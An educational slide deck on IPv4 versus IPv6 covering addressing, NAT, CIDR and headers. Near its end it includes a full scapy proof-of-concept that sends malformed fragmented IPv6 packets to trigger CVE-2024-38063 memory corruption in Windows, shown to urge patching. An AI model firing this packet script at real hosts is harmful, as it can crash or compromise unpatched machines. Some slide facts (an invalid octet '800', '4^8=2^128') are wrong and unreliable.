```mermaid
flowchart TD
    subgraph LAN/NAT
    subgraph Private
        2001:0db8:0000:0000:0000:8a2e:0370:7334 <-.-> 2001:0db8:0000:0000:0000:8a2e:0370:7335;
        2001:0db8:0000:0000:0000:8a2e:0370:7334 <-.-> 2001:0db8:0000:0000:0000:8a2e:0370:7336;
    end
    Gateway
    subgraph Public
        2001:0db8:0000:0000:0000:8a2e:0370:7334;
    end
end
    Public o-.-o Gateway o-.-o Private;
  ISP <--> LAN/NAT;
```

<!------->
<!--theme: the-unnamed-->
<!--author: Rhett Bulkley-->
<!--title: IPv6-->
<!--download: true-->
<!--exportFilename: cis-620-ipv6-->
<!--export:-->
<!--    format: pdf-->
<!--    timeout: 30000-->
<!--    dark: true-->
<!--    withClicks: true-->
<!--    withToc: false-->
<!--layout: about-me-->
<!--helloMsg: Who am I?-->
<!--name: "Rhett Bulkley"-->
<!--imageSrc: "./assets/profile_family.jpeg"-->
<!--job: "software developer"-->
<!--line1: "oss maintainer @standardjs"-->
<!--line2: "father of 3 -"-->
<!------->
<!--# About me-->
<!------->
<!--layout: cover-->
<!--background: text-center-->
<!--highlighter: shikiji-->
<!--transition: slide-left-->
<!--title: IPV6-->
<!--mdc: true-->
<!------->
<!--🚀 ☠️  🎮 "(1983) WarGames - Starring Matthew Broderick: A young man finds a back door into a military central computer in which reality is confused with game-playing, possibly starting World War III."*-->
<!---->
<!--<footer class="absolute bottom-0 left-0 right-0 p-5">-->
<!--*WarGames 1983 - IMDb-->
<!--</br> footage used under Creative Commons License-->
<!--</footer>-->
---
layout: default
---
# A view into my brain
<iframe src="https://giphy.com/embed/8rHwhRnIXTPOVrT1SP" width="100%" height="100%" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/pixel-board-chimpers-8rHwhRnIXTPOVrT1SP"></a></p>

---
layout: default
---
## Overview:
- What is an IP Address?
  - What necessitates a version 6? What happened to version 5?
- What benefits does IPV6 offer over IPV4?
- Looking to the future
  - What can we expect the next 10 years to look like?

<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>
---
mdc: true
---
# **Review:** What is an IP Address?
> IP Address are a digital representation of an network address used for host identification.
> An address consists of four of 4 sets of octets* or bytes. Each octect is 3 commonly represented as 1-3 digits.

</br>
</br>

For example:
```sh
185.107.800.231 #<-- IP address represented in digits
10111001 01101011 01010000 11100111 # <-- Represented in binary octet sets
```
<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>
---
mdc: true
---
# **Review:** IPV4 Maths
>An octet has a highest possible value of 255 (i.e. 11111111).
>This is to say 0-255 (256) possible digits per octet.

$1byte=8bits$

$4bytes=(8*4)=32bits$

$256*256*256*256=256^4=2^{32}=4294967296\ possible\ values$

*This number is simply not high enough for each device to be assigned an address.*

## **Result:** We need another solution -->

<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>

---
layout: default
mdc: true
---
# NAT (Network Address Translation)
> IP Addresses are translated between public and private, s.t. each home, business, etc. has their own router which knows how to route calls internally to devices.


---
layout: center
mdc: true
---


<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>

---
layout: iframe-right
url: https://cidr.xyz/
---

# What is a CIDR?
> A CIDR is a classification of network. Defined as "Classless Inter Domain Routing",
it is a way of allocating IP addresses into subnets.


**see [aws - what is a cidr](https://aws.amazon.com/what-is/cidr/) for more info**

<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>

---
layout: center
---
# IPV6: *the future has arrived*
Officially adopted in 2017 by the IETF as the new standard protocol for internet addressing. However it is still widely underutilized.

Internet Engineering Task Force, which is a standards organization for the internet.

[See IETF.org](https://ietf.org)
<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>

---
layout: default
---

> Why IPV6?

  We're out of IP Address space

> What is the difference?

  Eight groups of hexadecimal digits (or 128 bits / 16 bytes)

> What about IPV5?

  Intended for streams, it had a 32 bit limitation and was thus never officially adopted.

  (See [IEN 119](https://www.rfc-editor.org/ien/ien119.txt))

---
layout: default
mdc: true
---

### Example.

```sh
2001:0db8:0000:0000:0000:8a2e:0370:7334
```

$4*8=128\ bits = 16\ bytes$

$4^8=2^{128}= ~340\ undecillion\ possible\ addresses$


**see [RFC 2460](https://www.rfc-editor.org/rfc/rfc2460) for further details
<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>

---
layout: default
---
# IPV6 IOT
- Moving to the edge means more devices
- 340 undecillion allows for billions per person alive today.
- mobile networks will need this extra space to expand 5G s.t. each network capable device can perform optimally

---
layout: default
mdc: default
---
# What does this mean?
* ~~NAT~~
  * Instead there are enough numbers for every device to be assigned a public IP address.
* We will still want to/need to rely on common firewall protections to avoid security breaches.
* Windows CVE vulnerability likely tied to NAT/IPV6 issue
* Larger extension headers

<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>

---
layout: default
---
# Cont.
* Cloud IP allocation costs decrease because of higher supply of IP Addresses.
* SLAAC (Stateless Address Autoconfiguration)
* Multicasting
* Router performance increase

<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>

---
layout: full
mdc: default
---

# Header Differences
```markdown
                              IPV6                                                                    IPV4
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |  0                   1                   2                   3
   |Version| Traffic Class |           Flow Label                  | |  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Payload Length        |  Next Header  |   Hop Limit   | |  |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               | |  |         Identification        |Flags|      Fragment Offset    |
   +                                                               + |  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               | |  |  Time to Live |    Protocol   |         Header Checksum       |
   +                         Source Address                        + |  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               | |  |                       Source Address                          |
   +                                                               + |  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               | |  |                    Destination Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               | |  |                    Options                    |    Padding    |
   +                                                               + |  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               | |
   +                      Destination Address                      + |
   |                                                               | |
   +                                                               + |
   |                                                               | |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |

```
<footer class="absolute bottom-0 left-0 right-0 p-2">
  {{ $nav.currentPage }} / {{ $nav.total }} Note: fragment headers in ipv6 are handeled by source nodes only unlike ipv4 which uses routers.
</footer>

<!--
notes
# Benefits:
- With headers being vastly simplified routers don't need to hold as much in their routing tables to account for address translation.
-->

---
layout: full
mdc: true
drawings:
  enabled: true
---



<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>

---
layout: full
mdc: true
drawings:
  enabled: true
---


<footer class="absolute bottom-0 left-0 right-0 p-2">
{{ $nav.currentPage }} / {{ $nav.total }}
</footer>


---
layout: default
---
# Issues:
Why has IPV6 been so slow to adopt?
- Expensive dual compatible machinery (still in early adoption phase) <-- AWS is pushing harder though. IPV4 is being charged, IPV6 is free -->
- The cost incentives don't line up for ISPs (economies of scale disincentivize the disruption)
- Security concerns
  - Because in IPV6 IPSec can be built in, data authentication can be built in. However NAT provides valuable insight to the calls moving through network/transport layers.
  - Some rely NAT instead of placing the burden on the firewall leading to a misconception that IPV4 is less secure.
  - early adoption risk


---
layout: iframe-right
url: https://www.malwaretech.com/2024/08/exploiting-CVE-2024-38063.html
---
# CVE-2024-38063
- RCE In Windows

There is still a lot to be learned and worked through on IPV6

---
layout: full
---

```python
from scapy.all import *

iface=''
ip_addr=''
mac_addr=''
num_tries=20
num_batches=20

def get_packets_with_mac(i):
    frag_id = 0xdebac1e + i
    first = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m = 1, offset = 0) / 'aaaaaaaa'
    third = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m = 0, offset = 1)
    return [first, second, third]

def get_packets(i):
    if mac_addr != '':
        return get_packets_with_mac(i)
    frag_id = 0xdebac1e + i
    first = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m = 1, offset = 0) / 'aaaaaaaa'
    third = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m = 0, offset = 1)
    return [first, second, third]

final_ps = []
for _ in range(num_batches):
    for i in range(num_tries):
        final_ps += get_packets(i) + get_packets(i)

print("Sending packets")
if mac_addr != '':
    sendp(final_ps, iface)
else:
    send(final_ps, iface)

for i in range(60):
    print(f"Memory corruption will be triggered in {60-i} seconds", end='\r')
    time.sleep(1)
print("")
```


---
layout: default
---

# Patch your OS!

https://github.com/ynwarcs/CVE-2024-38063/

---
layout: default
---
References:
- WarGames (1983) - IMDb | https://www.imdb.com/title/tt0086567/?ref_=fn_al_tt_2
- What is CIDR? - CIDR Blocks and Notation | https://aws.amazon.com/what-is/cidr/
- CIDR.xyz | https://cidr.xyz
- IPv4 vs. IPv6 - What is IPV6? | https://www.thousandeyes.com/learning/techtorials/ipv4-vs-ipv6
- Guidlines on Firewalls and Firewall Policy - NIST Special Publication 800-41 Rev. 1 | https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-41r1.pdf
- IEN119 | https://www.rfc-editor.org/ien/ien119.txt (What is IPV5)
- RFC2460 | https://www.rfc-editor.org/rfc/rfc2460
- RFC8200 | https://www.rfc-editor.org/rfc/rfc8200
- What Happened to IPv5? | https://www.lifewire.com/what-happened-to-ipv5-3971327
- CVE-2024-38063 | https://github.com/ynwarcs/CVE-2024-38063
- Exploiting CVE-2024-38063 | https://www.malwaretech.com/2024/08/exploiting-CVE-2024-38063.html
---
layout: end
---
# Thank you!
